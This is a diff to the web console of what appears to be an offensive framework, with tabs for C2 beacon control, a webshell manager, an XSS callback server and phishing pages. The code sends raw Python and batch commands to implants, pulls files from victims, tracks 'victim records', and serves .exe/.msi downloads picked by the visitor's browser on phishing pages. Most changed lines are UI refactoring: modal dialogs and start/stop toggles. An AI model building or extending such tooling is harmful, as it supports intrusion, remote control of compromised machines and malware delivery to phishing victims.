@@ -27,6 +27,7 @@
         <span>implant_key <b id="st-key">-</b></span>
         <span id="st-clientkey" style="color:var(--danger);">client_key 未生成</span>
         <span style="flex:1;"></span>
+        <button id="c2-toggle-btn" class="btn btn-sm btn-primary" onclick="toggleC2()" title="启动/停止 C2 server">启动</button>
         <button class="btn btn-sm" onclick="openDeployModal()" title="生成 implant 部署命令">部署向导</button>
         <button class="btn btn-sm" onclick="openListenerModal()" title="配置 HTTPS/DNS/relay/socks5 等通道">通道配置</button>
         <button class="btn btn-sm" onclick="openAuditModal()" title="C2 操作审计日志">操作日志</button>
@@ -524,8 +525,7 @@
         <span>JS 模块 <b id="ph-modcount">-</b></span>
         <span>受害记录 <b id="ph-reportcount" style="color:var(--danger);">-</b></span>
         <span style="flex:1;"></span>
-        <button class="btn btn-sm" onclick="phStart()" title="启动 XSS 反连服务器">启动</button>
-        <button class="btn btn-sm" onclick="phStop()" title="停止 XSS 反连服务器">停止</button>
+        <button id="ph-toggle-btn" class="btn btn-sm btn-primary" onclick="togglePh()" title="启动/停止 XSS 反连服务器">启动</button>
         <button class="btn btn-sm" onclick="phRestart()" title="重启 XSS 反连服务器">重启</button>
         <button class="btn btn-sm" onclick="openPhAuditModal()" title="操作审计">操作日志</button>
     </div>
@@ -592,6 +592,7 @@
         <span>页面数 <b id="ph-pagecount">-</b></span>
         <span>服务器 <b id="ph-running2" style="color:var(--text-muted);">-</b></span>
         <span style="flex:1;"></span>
+        <button id="ph-toggle-btn2" class="btn btn-sm btn-primary" onclick="togglePh()" title="启动/停止钓鱼服务器">启动</button>
         <button class="btn btn-sm" onclick="loadPhPages()">刷新</button>
     </div>
 
@@ -620,19 +621,60 @@
                 <div style="font-size:0.76rem;line-height:1.7;padding:4px 0;color:var(--text-muted);">
                     <p>· 每个页面是一个文件夹(pages/&lt;页面名&gt;/),内含 index.html + style.css + app.js + meta.json</p>
                     <p>· 「设为当前」后,服务器根路径 <b>/</b> 即展示该页面</p>
-                    <p>· 「文件」按钮可读取/编辑页面内的 html/css/js(prompt 编辑器)</p>
+                    <p>· 「文件管理」弹窗可浏览/编辑页面内文件,上传文件请用右侧「下载物管理」的上传</p>
                     <p>· 页面 index.html 可内嵌 &lt;script src="/payload.js?m=模块"&gt; 与 XSS 反连 JS 结合</p>
                     <p>· 页面内支持 {{host}} / {{port}} 占位符(自动替换反连地址)</p>
                 </div>
             </div>
         </div>
 
-        {# ── 右栏:服务器状态(简版) ── #}
+        {# ── 右栏:服务器状态 + 下载物管理 ── #}
         <div class="wb-col wb-right">
             <div class="card">
                 <div class="card-title"><h3 style="margin:0;">服务器状态</h3></div>
                 <div id="ph-config2" style="padding:4px 0;font-size:0.76rem;line-height:1.8;color:var(--text-muted);">加载中...</div>
             </div>
+            <div class="card">
+                <div class="card-title">
+                    <h3 style="margin:0;">下载物管理</h3>
+                    <div class="action-buttons">
+                        <button class="btn btn-sm" onclick="phUploadPageFile()" title="上传文件到当前活动页面目录(如下载用的 .exe/.msi)">上传文件</button>
+                    </div>
+                </div>
+                <div style="font-size:0.72rem;line-height:1.6;padding:4px 0;color:var(--text-muted);">
+                    <p>· 下载物 = 名称 ↔ 路径/网址;页面 &lt;a data-download="名称"&gt; 引用</p>
+                    <p>· 浏览器匹配:chrome/firefox/edge/safari,空=通用;同名多条按访客 UA 自动选</p>
+                </div>
+                <div id="ph-downloads" style="padding:4px 0;font-size:0.72rem;"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+{# ── 通用对话框(替代 prompt/confirm/alert;居中模态框) ── #}
+<div id="fs3-dialog" class="fs3-modal-backdrop" style="display:none !important;position:fixed;top:0;right:0;bottom:0;left:0;z-index:1100;background:rgba(2,5,12,0.78);align-items:center;justify-content:center;">
+    <div class="fs3-modal-card" style="background:var(--surface);border:1px solid var(--border-bright);border-radius:14px;padding:26px;width:min(680px,94vw);max-height:85vh;overflow-y:auto;box-shadow:0 0 60px rgba(34,211,238,0.12),0 24px 60px rgba(0,0,0,0.5);">
+        <h3 id="fs3-dialog-title" style="margin:0 0 12px;">确认</h3>
+        <div id="fs3-dialog-body" style="font-size:0.82rem;color:var(--text);line-height:1.7;word-break:break-all;"></div>
+        <div style="margin-top:16px;display:flex;justify-content:flex-end;gap:8px;">
+            <button class="btn btn-sm" id="fs3-dialog-cancel" onclick="fs3DialogClose(null)">取消</button>
+            <button class="btn btn-sm btn-primary" id="fs3-dialog-ok" onclick="fs3DialogOk()">确定</button>
+        </div>
+    </div>
+</div>
+
+{# ── 文件管理弹窗(居中,fs3 类名防旧 CSS !important 覆盖;与 AI 分析一致) ── #}
+<div id="ph-files-modal" class="fs3-modal-backdrop" style="display:none !important;position:fixed;top:0;right:0;bottom:0;left:0;z-index:1000;background:rgba(2,5,12,0.78);align-items:center;justify-content:center;">
+    <div class="fs3-modal-card" style="background:var(--surface);border:1px solid var(--border-bright);border-radius:14px;padding:26px;width:min(720px,94vw);max-height:82vh;overflow-y:auto;box-shadow:0 0 60px rgba(34,211,238,0.12),0 24px 60px rgba(0,0,0,0.5);">
+        <h3 id="phfm-title" style="margin:0 0 14px;">文件管理</h3>
+        <div id="phfm-toolbar" style="margin-bottom:10px;">
+            <button class="btn btn-sm" id="phfm-new" onclick="phfmCreateFile()">+ 新建文件</button>
+            <button class="btn btn-sm" id="phfm-upload" onclick="phfmUploadFile()">上传文件</button>
+            <span id="phfm-msg" style="font-size:0.72rem;color:var(--text-muted);margin-left:8px;"></span>
+        </div>
+        <div id="phfm-list" style="max-height:50vh;overflow-y:auto;border:1px solid var(--border);border-radius:8px;padding:6px;font-size:0.76rem;"></div>
+        <div style="margin-top:12px;display:flex;justify-content:flex-end;gap:8px;">
+            <button class="btn btn-sm btn-primary" onclick="closePhFilesModal()">关闭</button>
         </div>
     </div>
 </div>
@@ -654,6 +696,97 @@ function escapeHtml(s) {
     return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
 }
 
+// ══════════ 通用模态对话框(替代 prompt/confirm/alert;居中 fs3 风格) ══════════
+var _fs3Dialog = null;          // 当前对话框 {mode, resolve, input}
+var _fs3InputEl = null;
+
+function fs3DialogOpen(opts) {
+    // opts: {title, message, mode: 'text'|'textarea'|'confirm'|'alert', value, placeholder, okText}
+    var modal = document.getElementById('fs3-dialog');
+    if (!modal) return;
+    document.getElementById('fs3-dialog-title').textContent = opts.title || '提示';
+    var body = document.getElementById('fs3-dialog-body');
+    var msg = opts.message || '';
+    if (opts.mode === 'text' || opts.mode === 'textarea') {
+        var rows = opts.mode === 'textarea' ? 18 : 1;
+        var inputHtml = '<textarea id="fs3-dialog-input" rows="' + rows +
+            '" style="width:100%;box-sizing:border-box;font-family:var(--font-mono);font-size:0.78rem;resize:vertical;background:rgba(3,7,15,0.6);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:8px;margin-top:8px;"' +
+            (opts.placeholder ? ' placeholder="' + escapeHtml(opts.placeholder) + '"' : '') + '></textarea>';
+        body.innerHTML = '<div style="white-space:pre-wrap;">' + escapeHtml(msg) + '</div>' + inputHtml;
+        _fs3InputEl = document.getElementById('fs3-dialog-input');
+        _fs3InputEl.value = opts.value || '';
+        setTimeout(function () { _fs3InputEl.focus(); _fs3InputEl.select(); }, 50);
+        document.getElementById('fs3-dialog-ok').style.display = '';
+    } else {
+        body.innerHTML = '<div style="white-space:pre-wrap;">' + escapeHtml(msg) + '</div>';
+        _fs3InputEl = null;
+        if (opts.mode === 'alert') {
+            document.getElementById('fs3-dialog-cancel').style.display = 'none';
+            document.getElementById('fs3-dialog-ok').textContent = opts.okText || '确定';
+        } else {
+            document.getElementById('fs3-dialog-cancel').style.display = '';
+            document.getElementById('fs3-dialog-ok').textContent = opts.okText || '确定';
+        }
+    }
+    _fs3Dialog = opts;
+    modal.style.setProperty('display', 'flex', 'important');
+}
+
+function fs3DialogClose(val) {
+    var modal = document.getElementById('fs3-dialog');
+    if (!modal) return;
+    modal.style.setProperty('display', 'none', 'important');
+    if (_fs3Dialog && _fs3Dialog.resolve) {
+        var r = _fs3Dialog.resolve;
+        _fs3Dialog = null;
+        r(val);
+    } else {
+        _fs3Dialog = null;
+    }
+}
+
+function fs3DialogOk() {
+    if (!_fs3Dialog) return;
+    if (_fs3InputEl) {
+        fs3DialogClose(_fs3InputEl.value);
+    } else {
+        fs3DialogClose(true);
+    }
+}
+
+// 页面内输入框(prompt 替代):返回 Promise<string|null>
+function fs3Prompt(message, value, placeholder, textarea) {
+    return new Promise(function (resolve) {
+        fs3DialogOpen({
+            title: '输入', message: message, mode: textarea ? 'textarea' : 'text',
+            value: value, placeholder: placeholder, okText: '确定',
+            resolve: resolve
+        });
+    });
+}
+
+// 页面内确认(confirm 替代):返回 Promise<boolean>
+function fs3Confirm(message, title) {
+    return new Promise(function (resolve) {
+        fs3DialogOpen({title: title || '确认', message: message, mode: 'confirm', okText: '确定', resolve: resolve});
+    });
+}
+
+// 页面内提示(alert 替代):返回 Promise<void>
+function fs3Alert(message, title) {
+    return new Promise(function (resolve) {
+        fs3DialogOpen({title: title || '提示', message: message, mode: 'alert', okText: '确定', resolve: resolve});
+    });
+}
+
+// Esc 关闭
+document.addEventListener('keydown', function (e) {
+    if (e.key === 'Escape') {
+        var dlg = document.getElementById('fs3-dialog');
+        if (dlg && dlg.style.display !== 'none') fs3DialogClose(null);
+    }
+});
+
 // ══════════ Tab 切换（c2 / webshell / xss / phishing） ══════════
 document.querySelectorAll('.cc-tab-link').forEach(function(link) {
     link.addEventListener('click', function(e) {
@@ -669,7 +802,7 @@ document.querySelectorAll('.cc-tab-link').forEach(function(link) {
         if (targetTab === 'c2') loadStatus();
         if (targetTab === 'webshell') loadWsConnections();
         if (targetTab === 'xss') { loadPhStatus(); loadPhModules(); loadPhReports(); loadPhConfig(); loadPhLinks(); }
-        if (targetTab === 'phishing') { loadPhStatus(); loadPhPages(); loadPhLinks(); }
+        if (targetTab === 'phishing') { loadPhStatus(); loadPhPages(); loadPhDownloads(); loadPhLinks(); }
     });
 });
 
@@ -906,14 +1039,14 @@ async function termCmd(line) {
     setTimeout(trackBeaconResults, 800);
 }
 
-function execCmd() {
+async function execCmd() {
     const raw = c2cmd.value;
     // 支持多行(Shift+回车):逐行顺序执行,每行单独进历史
     const lines = raw.split('\n').map(s => s.trim()).filter(Boolean);
     if (!lines.length) return;
     // 危险命令二次确认(kill/exit/persist/set_key/raw/uplevel/破坏性 exec 等)
     const danger = lines.filter(isDangerCmd);
-    if (danger.length && !confirm('检测到危险命令:\n' + danger.join('\n') + '\n\n确认执行？')) return;
+    if (danger.length && !(await fs3Confirm('检测到危险命令:\n' + danger.join('\n') + '\n\n确认执行？'))) return;
     lines.forEach(l => pushHistory(l));
     c2cmd.value = '';
     (async function() {
@@ -941,8 +1074,9 @@ async function loadStatus() {
     try {
         const resp = await fetch('/api/c2/status');
         const data = await resp.json();
-        if (!data.enabled) { errBox.textContent = data.error || 'C2 未启用'; errBox.style.display = 'block'; return; }
-        if (!data.running) { errBox.textContent = data.error || 'C2 启动失败'; errBox.style.display = 'block'; return; }
+        if (!data.enabled) { errBox.textContent = data.error || 'C2 未启用'; errBox.style.display = 'block'; updateC2Toggle(false); return; }
+        updateC2Toggle(!!data.running);
+        if (!data.running) { errBox.textContent = data.error || 'C2 已停止'; errBox.style.display = 'block'; return; }
     } catch (e) {
         errBox.textContent = '状态请求失败: ' + e.message; errBox.style.display = 'block'; return;
     }
@@ -952,6 +1086,35 @@ async function loadStatus() {
     loadCommands();
     loadAutoCommands();
     loadModuleFiles();
+}
+
+// 启动/停止 toggle 按钮:运行中=「停止」(danger),已停止=「启动」(primary)
+function updateC2Toggle(running) {
+    const btn = document.getElementById('c2-toggle-btn');
+    if (!btn) return;
+    btn.textContent = running ? '停止' : '启动';
+    btn.className = 'btn btn-sm ' + (running ? 'btn-danger' : 'btn-primary');
+}
+
+async function toggleC2() {
+    const running = document.getElementById('c2-toggle-btn').textContent === '停止';
+    if (running && !(await fs3Confirm('停止 C2 server？beacon 将全部掉线,停止后需手动点「启动」恢复。确认停止？'))) return;
+    const btn = document.getElementById('c2-toggle-btn');
+    const label = running ? '停止' : '启动';
+    btn.textContent = label + '中...';
+    btn.disabled = true;
+    try {
+        const resp = await fetch(running ? '/api/c2/stop' : '/api/c2/start', {method: 'POST'});
+        const data = await resp.json();
+        showNotice((data.ok ? '✓ ' : '✗ ') + (data.message || data.error || ''), data.ok);
+        updateC2Toggle(!!data.running);
+        loadStatus();
+    } catch (e) {
+        showNotice('✗ 请求失败: ' + e.message, false);
+        loadStatus();
+    } finally {
+        btn.disabled = false;
+    }
 }
 
 async function loadStatusDetail() {
@@ -979,7 +1142,7 @@ async function loadStatusDetail() {
 }
 
 async function genClientKey() {
-    if (!confirm('生成 client_key 并写回 config.json？(client 通道加密密钥,生成后即可用 client 连接)')) return;
+    if (!(await fs3Confirm('生成 client_key 并写回 config.json？(client 通道加密密钥,生成后即可用 client 连接'))) return;
     const resp = await fetch('/api/c2/keygen', {method: 'POST'});
     const data = await resp.json();
     showNotice((data.ok ? '✓ ' : '✗ ') + (data.message || data.error || ''), data.ok);
@@ -1104,7 +1267,7 @@ async function execBatchCmd() {
     const bids = Object.keys(selectedBeacons);
     if (!line) { showNotice('批量命令为空', false); return; }
     if (!bids.length) { showNotice('未选择 beacon', false); return; }
-    if (isDangerCmd(line) && !confirm('批量执行危险命令: ' + line + '\n目标 ' + bids.length + ' 个 beacon，确认？')) return;
+    if (isDangerCmd(line) && !(await fs3Confirm('批量执行危险命令: ' + line + '\n目标 ' + bids.length + ' 个 beacon，确认？'))) return;
     let okN = 0;
     for (const bid of bids) {
         try {
@@ -1264,7 +1427,7 @@ async function bdDownload() {
     if (!bdBeacon) return;
     const p = fpath();
     if (!p) { showNotice('路径为空', false); return; }
-    const ok = confirm('对 ' + bdBeacon.client_id + ' 下发 download: ' + p + '\n文件会分块传回服务器(reports/c2/ 或模块输出目录),确认？');
+    const ok = await fs3Confirm('对 ' + bdBeacon.client_id + ' 下发 download: ' + p + '\n文件会分块传回服务器(reports/c2/ 或模块输出目录),确认？');
     if (!ok) return;
     termAppend('pyexec> use ' + bdBeacon.client_id, 'techo');
     await termCmd('download ' + p);
@@ -1410,7 +1573,7 @@ async function saveListenerConfig() {
 }
 
 async function restartC2() {
-    if (!confirm('重启 C2 server？beacon 会自动重连(间隔约一个回连周期),当前待办任务保留。确认重启？')) return;
+    if (!(await fs3Confirm('重启 C2 server？beacon 会自动重连(间隔约一个回连周期),当前待办任务保留。确认重启？'))) return;
     const statusEl = document.getElementById('lc-status');
     statusEl.textContent = '重启中...';
     statusEl.style.color = 'var(--text-muted)';
@@ -1491,11 +1654,11 @@ function renderSmoduleList() {
 // ══════════ 模块详情 / 测试 模态框 ══════════
 let currentModule = null;   // {name, type: 'implant'|'server', filename?}
 
-function openModuleModal(name) {
+async function openModuleModal(name) {
     fetch('/api/c2/module/' + encodeURIComponent(name))
         .then(r => r.json())
         .then(data => {
-            if (!data.ok) { alert(data.error || '加载失败'); return; }
+            if (!data.ok) { fs3Alert(data.error || '加载失败'); return; }
             const m = data.module;
             currentModule = {name: m.name, type: 'implant'};
             document.getElementById('mm-title').textContent = '植入模块 · ' + m.name + ' (' + m.type + ')';
@@ -1513,7 +1676,7 @@ function openModuleModal(name) {
             document.getElementById('mm-output').style.display = 'none';
             document.getElementById('module-modal').style.display = 'flex';
         })
-        .catch(e => alert('加载失败: ' + e.message));
+        .catch(e => fs3Alert('加载失败: ' + e.message));
 }
 
 function openServerModuleModal(name) {
@@ -1554,7 +1717,7 @@ async function buildModulePreview() {
 
 async function execModuleFromModal() {
     if (!currentModule) return;
-    if (!currentBid) { alert('请先在左侧选中一个 beacon'); return; }
+    if (!currentBid) { fs3Alert('请先在左侧选中一个 beacon'); return; }
     const resp = await fetch('/api/c2/module/exec', {method: 'POST', headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({client_id: currentBid, name: currentModule.name, args: mmArgs()})});
     const data = await resp.json();
@@ -1564,19 +1727,19 @@ async function execModuleFromModal() {
     loadBeacons();
 }
 
-function runServerModule() {
+async function runServerModule() {
     if (!currentModule) return;
-    const argsStr = prompt('运行参数（空格分隔，可空）:', '') || '';
+    const argsStr = await fs3Prompt('运行参数（空格分隔，可空）:', '') || '';
     termCmd('s_exec ' + currentModule.name + (argsStr.trim() ? ' ' + argsStr.trim() : ''));
     closeModuleModal();
 }
 
 async function deleteModuleFromModal() {
     if (!currentModule || currentModule.type !== 'implant') return;
-    if (!confirm('确认删除植入模块 ' + currentModule.name + ' ？此操作会从 modules/ 删除文件并热生效。')) return;
+    if (!(await fs3Confirm('确认删除植入模块 ' + currentModule.name + ' ？此操作会从 modules/ 删除文件并热生效。'))) return;
     const resp = await fetch('/api/c2/module/' + encodeURIComponent(currentModule.name), {method: 'DELETE'});
     const data = await resp.json();
-    alert(data.message || (data.ok ? '已删除' : '删除失败'));
+    fs3Alert(data.message || (data.ok ? '已删除' : '删除失败'));
     if (data.ok) { closeModuleModal(); loadModules(); loadModuleFiles(); }
 }
 
@@ -1611,10 +1774,10 @@ async function loadModuleFiles() {
 }
 
 async function deleteModuleFile(filename) {
-    if (!confirm('确认删除模块文件 ' + filename + ' ？')) return;
+    if (!(await fs3Confirm('确认删除模块文件 ' + filename + ' ？'))) return;
     const resp = await fetch('/api/c2/module/' + encodeURIComponent(filename), {method: 'DELETE'});
     const data = await resp.json();
-    alert(data.message || (data.ok ? '已删除' : '删除失败'));
+    fs3Alert(data.message || (data.ok ? '已删除' : '删除失败'));
     if (data.ok) { loadModuleFiles(); loadModules(); }
 }
 
@@ -1759,15 +1922,15 @@ function renderSnippets() {
         list.map((s, i) => '<option value="' + i + '">' + escapeHtml(s.name) + '</option>').join('');
 }
 
-function saveSnippet() {
+async function saveSnippet() {
     const code = pyCode.value.trim();
-    if (!code) { alert('代码为空'); return; }
-    const name = prompt('片段名称:', 'snippet-' + new Date().toISOString().slice(11, 19)) || '';
+    if (!code) { fs3Alert('代码为空'); return; }
+    const name = await fs3Prompt('片段名称:', 'snippet-' + new Date().toISOString().slice(11, 19)) || '';
     if (!name) return;
     const list = getSnippets();
     list.push({name: name, code: code});
     setSnippets(list);
-    alert('已保存片段: ' + name);
+    fs3Alert('已保存片段: ' + name);
 }
 
 function loadSnippet() {
@@ -1776,12 +1939,12 @@ function loadSnippet() {
     pyCode.value = getSnippets()[parseInt(sel.value, 10)].code;
 }
 
-function delSnippet() {
+async function delSnippet() {
     const sel = document.getElementById('py-snippets');
     if (!sel.value) return;
     const list = getSnippets();
     const name = list[parseInt(sel.value, 10)].name;
-    if (!confirm('删除片段 ' + name + ' ？')) return;
+    if (!(await fs3Confirm('删除片段 ' + name + ' ？'))) return;
     list.splice(parseInt(sel.value, 10), 1);
     setSnippets(list);
 }
@@ -1790,8 +1953,8 @@ function clearEditor() { pyCode.value = ''; }
 
 async function sendRawCode() {
     const code = pyCode.value.trim();
-    if (!code) { alert('代码为空'); return; }
-    if (!currentBid) { alert('请先在左侧选中一个 beacon'); return; }
+    if (!code) { fs3Alert('代码为空'); return; }
+    if (!currentBid) { fs3Alert('请先在左侧选中一个 beacon'); return; }
     termAppend('pyexec> raw (Python 代码, ' + code.split('\n').length + ' 行)', 'techo');
     const resp = await fetch('/api/c2/raw', {method: 'POST', headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({client_id: currentBid, code: code})});
@@ -1885,7 +2048,7 @@ function closeWsForm() { document.getElementById('ws-modal-mask').style.display 
 async function wsFormSave() {
     const id = document.getElementById('wsf-id').value;
     const url = document.getElementById('wsf-url').value.trim();
-    if (!url) { alert('URL 必填'); return; }
+    if (!url) { fs3Alert('URL 必填'); return; }
     const body = {
         url: url,
         password: document.getElementById('wsf-password').value.trim(),
@@ -1901,22 +2064,22 @@ async function wsFormSave() {
         if (id) {
             const r = await fetch('/api/webshell/connection/' + id, {method: 'PUT', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(body)});
             const d = await r.json();
-            if (!d.ok) { alert(d.error || '保存失败'); return; }
+            if (!d.ok) { fs3Alert(d.error || '保存失败'); return; }
         } else {
             const r = await fetch('/api/webshell/connections', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(body)});
             const d = await r.json();
-            if (!d.ok) { alert(d.error || '创建失败'); return; }
+            if (!d.ok) { fs3Alert(d.error || '创建失败'); return; }
             currentWsId = d.connection.id;
         }
         closeWsForm();
         await loadWsConnections();
         if (currentWsId) selectWsConn(currentWsId);
-    } catch (e) { alert('请求失败: ' + e.message); }
+    } catch (e) { fs3Alert('请求失败: ' + e.message); }
 }
 
 // ── 导出/导入 ──
-function wsExport() {
-    if (!allWsConns.length) { alert('无连接可导出'); return; }
+async function wsExport() {
+    if (!allWsConns.length) { fs3Alert('无连接可导出'); return; }
     const blob = new Blob([JSON.stringify(allWsConns, null, 2)], {type: 'application/json'});
     const a = document.createElement('a');
     a.href = URL.createObjectURL(blob);
@@ -1925,7 +2088,7 @@ function wsExport() {
     URL.revokeObjectURL(a.href);
 }
 
-function wsImport() {
+async function wsImport() {
     const input = document.createElement('input');
     input.type = 'file';
     input.accept = '.json,application/json';
@@ -1945,9 +2108,9 @@ function wsImport() {
                 const d = await r.json();
                 if (d.ok) ok++; else fail++;
             }
-            alert('导入完成: 成功 ' + ok + ' 条' + (fail ? ', 失败 ' + fail + ' 条' : ''));
+            fs3Alert('导入完成: 成功 ' + ok + ' 条' + (fail ? ', 失败 ' + fail + ' 条' : ''));
             loadWsConnections();
-        } catch (e) { alert('导入失败: ' + e.message); }
+        } catch (e) { fs3Alert('导入失败: ' + e.message); }
     };
     input.click();
 }
@@ -2010,7 +2173,7 @@ async function wsGenTemplate() {
         var j = await d.json();
         wsTplCache = j.templates || [];
         renderWsTplList();
-    } catch (e) { alert('加载模板库失败: ' + e); }
+    } catch (e) { fs3Alert('加载模板库失败: ' + e); }
 }
 function renderWsTplList() {
     var box = document.getElementById('ws-tpl-list');
@@ -2074,7 +2237,7 @@ function wsTplSelect(name) {
     document.getElementById('ws-tpl-note').textContent = '';
 }
 async function wsTplBuild() {
-    if (!wsTplSelected) { alert('先在左侧选择模板模块'); return; }
+    if (!wsTplSelected) { fs3Alert('先在左侧选择模板模块'); return; }
     var params = {};
     document.querySelectorAll('#ws-tpl-fields [data-param]').forEach(function(el) {
         params[el.getAttribute('data-param')] = el.value;
@@ -2086,25 +2249,25 @@ async function wsTplBuild() {
             body: JSON.stringify({ name: wsTplSelected, params: params })
         });
         var j = await d.json();
-        if (!j.ok) { alert(j.error || '生成失败'); return; }
+        if (!j.ok) { fs3Alert(j.error || '生成失败'); return; }
         document.getElementById('ws-tpl-code').textContent = j.code;
         document.getElementById('ws-tpl-note').textContent = j.note || '';
-    } catch (e) { alert('生成失败: ' + e); }
+    } catch (e) { fs3Alert('生成失败: ' + e); }
 }
 function wsCloseTpl() {
     document.getElementById('ws-tpl-mask').style.display = 'none';
 }
-function wsCopyTpl() {
+async function wsCopyTpl() {
     var el = document.getElementById('ws-tpl-code');
     if (!el.textContent) return;
     if (navigator.clipboard && navigator.clipboard.writeText) {
-        navigator.clipboard.writeText(el.textContent).then(function(){ alert('已复制'); }, function(){ alert('复制失败,请手动选择复制'); });
+        navigator.clipboard.writeText(el.textContent).then(function(){ fs3Alert('已复制'); }, function(){ fs3Alert('复制失败,请手动选择复制'); });
     } else {
         var ta = document.createElement('textarea');
         ta.value = el.textContent;
         document.body.appendChild(ta);
         ta.select();
-        try { document.execCommand('copy'); alert('已复制'); } catch (e) {}
+        try { document.execCommand('copy'); fs3Alert('已复制'); } catch (e) {}
         document.body.removeChild(ta);
     }
 }
@@ -2112,12 +2275,12 @@ function wsCopyTpl() {
 async function editWsConn() {
     const r = await fetch('/api/webshell/connection/' + currentWsId);
     const d = await r.json();
-    if (!d.ok) { alert(d.error || '加载失败'); return; }
+    if (!d.ok) { fs3Alert(d.error || '加载失败'); return; }
     openWsForm(d.connection);
 }
 
 async function delWsConn(id) {
-    if (!confirm('确认删除该连接？')) return;
+    if (!(await fs3Confirm('确认删除该连接？'))) return;
     await fetch('/api/webshell/connection/' + id, {method: 'DELETE'});
     if (id === currentWsId) {
         currentWsId = '';
@@ -2190,10 +2353,10 @@ function renderWsOutput() {
     el.scrollTop = el.scrollHeight;
 }
 
-function copyWsOutput() {
+async function copyWsOutput() {
     const text = wsOutputHistory.map(function(h) { return h.text; }).join('\n');
-    navigator.clipboard.writeText(text).then(function() { alert('已复制 ' + wsOutputHistory.length + ' 行'); })
-        .catch(function() { alert('复制失败'); });
+    navigator.clipboard.writeText(text).then(function() { fs3Alert('已复制 ' + wsOutputHistory.length + ' 行'); })
+        .catch(function() { fs3Alert('复制失败'); });
 }
 
 function clearWsHistory() {
@@ -2209,8 +2372,8 @@ function wsTimeout() {
 
 async function wsExec() {
     const command = document.getElementById('ws-cmd').value.trim();
-    if (!currentWsId) { alert('请先选择或新建连接'); return; }
-    if (!command) { alert('命令为空'); return; }
+    if (!currentWsId) { fs3Alert('请先选择或新建连接'); return; }
+    if (!command) { fs3Alert('命令为空'); return; }
     wsCmdHistory = wsCmdHistory.filter(function(c) { return c !== command; });
     wsCmdHistory.push(command);
     if (wsCmdHistory.length > 20) wsCmdHistory.shift();
@@ -2338,18 +2501,18 @@ function wsFileUp() {
     wsFileList(parent);
 }
 
-function wsFileRead(path) {
-    const content = prompt('读取 ' + path + ' 到输出区?路径确认:', path) || path;
+async function wsFileRead(path) {
+    const content = await fs3Prompt('读取 ' + path + ' 到输出区?路径确认:', path) || path;
     wsFileOp('read', content);
     wsSwitchSub('term');
 }
 
-function wsFileDownload(path, name) {
+async function wsFileDownload(path, name) {
     const resp = fetch('/api/webshell/fileop', {method: 'POST', headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({conn_id: currentWsId, action: 'read', path: path, timeout: wsTimeout()})})
         .then(function(r) { return r.json(); })
         .then(function(data) {
-            if (!data.exec_ok) { alert('下载失败: ' + (data.error || '无输出')); return; }
+            if (!data.exec_ok) { fs3Alert('下载失败: ' + (data.error || '无输出')); return; }
             const blob = new Blob([data.output], {type: 'application/octet-stream'});
             const a = document.createElement('a');
             a.href = URL.createObjectURL(blob);
@@ -2357,11 +2520,11 @@ function wsFileDownload(path, name) {
             a.click();
             URL.revokeObjectURL(a.href);
         })
-        .catch(function(e) { alert('下载失败: ' + e.message); });
+        .catch(function(e) { fs3Alert('下载失败: ' + e.message); });
 }
 
-function wsFileRename(path) {
-    const target = prompt('重命名 ' + path + ' → 新路径:', path) || '';
+async function wsFileRename(path) {
+    const target = await fs3Prompt('重命名 ' + path + ' → 新路径:', path) || '';
     if (!target || target === path) return;
     const resp = fetch('/api/webshell/fileop', {method: 'POST', headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({conn_id: currentWsId, action: 'rename', path: path, target_path: target, timeout: wsTimeout()})})
@@ -2373,8 +2536,8 @@ function wsFileRename(path) {
         });
 }
 
-function wsFileDelete(path) {
-    if (!confirm('确认删除 ' + path + ' ?')) return;
+async function wsFileDelete(path) {
+    if (!(await fs3Confirm('确认删除 ' + path + ' ?'))) return;
     const resp = fetch('/api/webshell/fileop', {method: 'POST', headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({conn_id: currentWsId, action: 'delete', path: path, timeout: wsTimeout()})})
         .then(function(r) { return r.json(); })
@@ -2385,16 +2548,16 @@ function wsFileDelete(path) {
         });
 }
 
-function wsUploadFile() {
-    if (!currentWsId) { alert('请先选择连接'); return; }
-    const path = prompt('上传到路径(含文件名):', wsJoinPath(wsCwd, 'upload.bin')) || '';
+async function wsUploadFile() {
+    if (!currentWsId) { fs3Alert('请先选择连接'); return; }
+    const path = await fs3Prompt('上传到路径(含文件名):', wsJoinPath(wsCwd, 'upload.bin')) || '';
     if (!path) return;
     const input = document.createElement('input');
     input.type = 'file';
     input.onchange = function() {
         const f = input.files[0];
         if (!f) return;
-        if (f.size > 3 * 1024 * 1024) { alert('文件超过 3MB，请拆分上传'); return; }
+        if (f.size > 3 * 1024 * 1024) { fs3Alert('文件超过 3MB，请拆分上传'); return; }
         const reader = new FileReader();
         reader.onload = function() {
             // 二进制安全:读为 base64,后端检测 FS3B64: 前缀直接写
@@ -2425,8 +2588,8 @@ function wsFileOp(action, path) {
         });
 }
 
-function wsFileOpPrompt(action) {
-    const path = prompt('路径:', wsCwd === '.' ? '/' : wsCwd) || '';
+async function wsFileOpPrompt(action) {
+    const path = await fs3Prompt('路径:', wsCwd === '.' ? '/' : wsCwd) || '';
     if (!path) return;
     if (action === 'mkdir') {
         const resp = fetch('/api/webshell/fileop', {method: 'POST', headers: {'Content-Type': 'application/json'},
@@ -2472,14 +2635,14 @@ async function loadWsHistory() {
 
 async function clearWsHistoryAll() {
     if (!currentWsId) return;
-    if (!confirm('清空该连接的全部执行历史？')) return;
+    if (!(await fs3Confirm('清空该连接的全部执行历史？'))) return;
     await fetch('/api/webshell/history/' + currentWsId, {method: 'DELETE'});
     loadWsHistory();
 }
 
 // ── 初始化 ──
 renderSnippets();
-{% if tab == 'c2' %}loadStatus();{% elif tab == 'xss' %}loadPhStatus(); loadPhModules(); loadPhReports(); loadPhConfig(); loadPhLinks();{% elif tab == 'phishing' %}loadPhStatus(); loadPhPages(); loadPhLinks();{% else %}loadWsConnections();{% endif %}
